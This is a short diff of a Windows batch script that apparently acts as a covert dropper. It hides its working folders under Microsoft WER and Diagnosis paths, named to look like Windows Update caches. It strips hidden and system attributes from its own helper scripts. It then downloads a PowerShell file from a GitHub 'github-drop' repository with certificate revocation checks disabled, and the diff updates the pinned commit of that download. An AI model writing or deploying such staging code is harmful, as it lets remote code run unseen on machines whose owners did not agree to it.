@@ -4,7 +4,7 @@ setlocal
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
 set "CURL=%SystemRoot%\System32\curl.exe"
-set "PIN=2d747dc"
+set "PIN=acc7a0c"
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_lib.ps1" "%WD%\own_gryxa.cmd" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 60 -o "%WD%\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_lib.ps1?t=%RANDOM%"
